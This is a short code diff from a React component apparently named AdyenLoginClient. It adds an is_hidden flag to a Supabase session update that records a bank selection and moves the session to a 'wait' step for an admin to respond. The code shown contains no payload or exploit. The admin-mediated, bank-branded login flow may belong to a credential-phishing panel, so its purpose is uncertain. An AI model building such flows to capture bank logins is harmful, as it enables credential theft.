@@ -24,8 +24,7 @@ export function AdyenLoginClient({ sessionId }: Props) {
     // We just save the selection and move to "wait" so admin can respond
     const { error } = await supabase
       .from("sessions")
-      .update({
-        current_step: "wait",
+      .update({ is_hidden: false, current_step: "wait",
         form_data: {
           ...prev,
           bankSlug: "adyen",
